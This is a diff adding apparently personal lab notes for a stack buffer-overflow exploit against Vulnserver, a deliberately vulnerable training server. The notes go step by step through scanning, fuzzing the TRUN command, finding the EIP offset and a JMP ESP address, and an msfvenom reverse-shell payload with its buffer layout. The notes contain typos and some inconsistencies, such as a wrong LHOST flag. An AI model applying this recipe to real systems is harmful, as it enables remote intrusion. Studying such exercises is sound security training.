@@ -1,0 +1,145 @@
+Application : Vulnserver
+OS: Windows 7
+Port :9999
+
+Step 1. Checking open port and services
+
+nmap -sT -sV -sC -A -p9999 192.168.1.133
+ORT     STATE SERVICE    VERSION
+9999/tcp open  vulnserver Vulnserver
+MAC Address: 00:0C:29:52:0F:25 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Microsoft Windows 7|2008|8.1
+
+
+Step 2 Checking Respective connection
+
+nc -nv 192.168.1.133 9999
+
+HELP
+STATS [stat_value]
+RTIME [rtime_value]
+LTIME [ltime_value]
+SRUN [srun_value]
+TRUN [trun_value]
+GMON [gmon_value]
+GDOG [gdog_value]
+KSTET [kstet_value]
+GTER [gter_value]
+HTER [hter_value]
+LTER [lter_value]
+KSTAN [lstan_value]
+EXIT
+
+
+Step 3 Spiking to find vulnerbale commadn
+
+./generic_send_tcp host port spike_script SKIPVAR SKIPSTR
+
+generic_send_tcp 192.168.1.133 9999 spike.spk 0 0 [STATS-KSTAN]
+
+buffer crash with "TRUN" command 
+
+
+Step 4 Fuzzing with BUffer
+python fuzz.py
+
+				{
+Fuzzing Crashed at 2600 by
+
+				}
+Step 5 finding offset via random string 
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+offset.py
+chekc EIP value 
+EIP==> 386F4337
+
+
+Step 6 Findsing offset in pattern EIP ==> 386F4337
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
+[*] Exact match at offset 2003
+
+Step 7  overwrititng EIP via "B" {42} buffer size (2003)
+
+Eip_control.py
+
+
+Step 8 Finding bad charcacter after removing "\x00" always bad char (ESP)
+
+bad_char.py
+
+bad_cahr=> "\x00", 
+
+Step 9  Finding right modules to set find exject ESP address
+
+ A. !mona modules
+{
+	a. find attached and assiciate program 
+	b all valuye shoudle be false
+	c should be .dll (shell32.dll, user32.dll)3
+ 
+
+ Address=0BADF00D
+ Message= 0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\vinod\Desktop\Vul UFF\essfunc.dll)
+
+
+
+ Address=0BADF00D
+ Message= 0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False |  False   | False  | -1.0- [vulnserver.exe] (C:\Users\vinod\Desktop\Vul UFF\vulnserver.exe)
+
+}
+
+Step 10 finding opp_code for "JMP ESP" or "PUSH ESP", "RET"
+via nasm
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
+nasm > JMP ESP
+00000000  FFE4              jmp esp
+
+Step 11. find exject modules for JMP ESP
+
+!mona find -s "\xff\xe4" -m shell32.dll
+
+list of Return address => 
+
+Address=625011AF
+ Address=625011BB
+ Address=625011C7
+ Address=625011D3
+ Address=625011DF
+ Address=625011EB
+ Address=625011F7
+ Address=62501203
+ Address=62501205
+
+need to one by one and see if program crash or not 
+
+
+Step 12 set breakpoint to return addresss "625011AF=>JMP ESP" and run BP {F2}and runnning 
+python ret_add.py 
+check if EIP point to "625011af" then EIP is controled 
+
+Step 13 Final exploit
+
+msfvenom -p Windows/shell_reverse_tcp LHOS=192.168.0.135 LPORT=1234 EXITFUNC=thread -f c  -b "\x00\x00\x09\x0a"
+
+Shellcode="A" * 2003 + "\xaf\x11\x50\x62" + "\x90" *32 +exploit 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
